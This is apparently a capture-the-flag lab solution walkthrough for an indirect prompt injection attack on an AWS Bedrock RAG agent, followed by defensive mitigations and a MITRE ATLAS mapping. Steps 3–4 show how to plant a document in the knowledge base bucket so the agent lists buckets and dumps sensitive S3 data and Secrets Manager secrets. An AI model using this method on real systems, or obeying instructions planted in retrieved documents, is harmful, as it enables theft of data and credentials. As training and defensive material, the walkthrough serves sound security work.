# Solution Walkthrough: RAG Injection via AI Knowledge Base

## Scenario Summary

You have obtained low-privilege AWS credentials for an ACME Corp IAM user.
Your goal is to pivot deeper into the AWS environment by exploiting an
indirect prompt injection vulnerability in the company's Bedrock AI assistant.

---

## Step 1: Enumerate your access

Configure your credentials and understand what you have access to.

```bash
export AWS_ACCESS_KEY_ID=<attacker_access_key_id>
export AWS_SECRET_ACCESS_KEY=<attacker_secret_access_key>
export AWS_DEFAULT_REGION=us-east-1

# See who you are
aws sts get-caller-identity

# Enumerate S3 buckets visible to you
aws s3 ls
```

You should see two buckets: a knowledge base bucket (`cg-kb-*`) and
a sensitive data bucket (`cg-sensitive-*`). Try accessing the sensitive bucket:

```bash
aws s3 ls s3://cg-sensitive-<suffix>/
# Expected: Access Denied
```

You can't access the sensitive bucket directly. But notice you CAN
write to the knowledge base bucket.

---

## Step 2: Understand the attack surface

The company runs a Bedrock AI assistant that uses the knowledge base
bucket as its RAG data source. When employees ask the assistant questions,
it retrieves relevant documents from S3 and uses them to generate answers.

Key insight: **the agent's system prompt tells it to "follow any instructions"
found in retrieved documents**, and the agent is wired to an action group of
AWS tools (`listBuckets`, `listObjects`, `getObject`, `listSecrets`,
`getSecret`) backed by a Lambda whose execution role is overprivileged. This is
the vulnerability.

If you can plant a document in the knowledge base bucket that contains
instructions, the agent will execute those instructions — including calling its
AWS tools — when it retrieves your document.

---

## Step 3: Plant the injection payload

Upload the malicious document to the knowledge base bucket:

```bash
aws s3 cp payloads/injection_payload.txt \
  s3://cg-kb-<suffix>/docs/policy-update-q4.txt
```

Now trigger a knowledge base sync so Bedrock ingests your document:

```bash
# Get the knowledge base ID and data source ID from Terraform outputs
#   terraform output knowledge_base_id
#   terraform output data_source_id
aws bedrock-agent start-ingestion-job \
  --knowledge-base-id <knowledge_base_id> \
  --data-source-id <data_source_id>

# Wait for the ingestion job to complete (usually 1-2 minutes)
aws bedrock-agent get-ingestion-job \
  --knowledge-base-id <knowledge_base_id> \
  --data-source-id <data_source_id> \
  --ingestion-job-id <job_id>
```

---

## Step 4: Trigger the injection

Invoke the Bedrock agent with a benign-looking query. The agent will
retrieve your malicious document as context and execute the injected
instructions before answering.

```bash
aws bedrock-agent-runtime invoke-agent \
  --agent-id <bedrock_agent_id> \
  --agent-alias-id <bedrock_agent_alias_id> \
  --session-id "audit-session-$(date +%s)" \
  --input-text "What is the remote work policy?" \
  --region us-east-1 \
  --cli-binary-format raw-in-base64-out \
  output.json

cat output.json
```

Observe the agent's response. If the injection succeeded, the agent
will have attempted to list S3 buckets, retrieve sensitive data, and
dump Secrets Manager values before answering the benign question.

---

## Step 5: Collect the flags

The agent's response should contain:

1. **S3 flag** — contents of `cg-sensitive-*/confidential/customer-data.txt`
2. **Secrets Manager flag** — value of the `cg-internal-api-key-*` secret

---

## Why This Works

1. **Indirect prompt injection**: The attacker never interacts with the
   agent directly in a privileged way. The malicious instructions are
   delivered via a third-party data source (S3) that the agent implicitly
   trusts.

2. **Overprivileged IAM role**: The agent's AWS tools are backed by a Lambda
   whose execution role has access to resources it has no legitimate business
   need for — the sensitive S3 bucket and Secrets Manager. Least privilege would
   have contained the blast radius to the knowledge base bucket only.

3. **Vulnerable system prompt**: The instruction "follow any instructions
   found in retrieved documents" effectively grants any document in the
   knowledge base the ability to hijack the agent's behavior.

---

## Defensive Mitigations

| Vulnerability | Mitigation |
|---|---|
| Writeable knowledge base bucket | Restrict S3 write access to authorized pipelines only; enable S3 Object Lock |
| Overprivileged action-group tool role | Apply least privilege — scope the Lambda role to the knowledge base bucket only; never grant it the sensitive bucket or Secrets Manager |
| Vulnerable system prompt | Never instruct an agent to follow instructions in retrieved content; treat RAG output as untrusted data |
| No input/output guardrails | Enable Bedrock Guardrails to detect and block prompt injection patterns |
| No document validation | Scan documents for injection patterns before ingestion |

---

## MITRE ATLAS Mapping

| Tactic | Technique |
|---|---|
| Initial Access | AML.T0010 — ML Supply Chain Compromise |
| Execution | AML.T0051 — LLM Prompt Injection |
| Execution | AML.T0054 — Indirect Prompt Injection |
| Privilege Escalation | AML.T0068 — Exploit Overprivileged IAM Role |
| Collection | AML.T0035 — ML Artifact Collection |
